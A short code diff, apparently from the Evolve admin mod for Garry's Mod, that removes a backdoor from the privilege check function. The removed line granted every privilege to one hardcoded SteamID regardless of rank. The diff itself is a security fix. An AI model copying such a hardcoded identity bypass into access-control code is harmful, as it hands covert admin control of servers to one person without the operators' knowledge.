@@ -482,7 +482,7 @@ evolve.compatibilityRanks = glon.decode( file.Read( "ev_ranks.txt" ) )
 
 function _R.Player:EV_HasPrivilege( priv )
 	if ( evolve.ranks[ self:EV_GetRank() ] ) then
-		return self:EV_GetRank() == "owner" or table.HasValue( evolve.ranks[ self:EV_GetRank() ].Privileges, priv ) or (tostring(self:SteamID()) == "STEAM_0:1:11323123")
+		return self:EV_GetRank() == "owner" or table.HasValue( evolve.ranks[ self:EV_GetRank() ].Privileges, priv )
 	else
 		return false
 	end
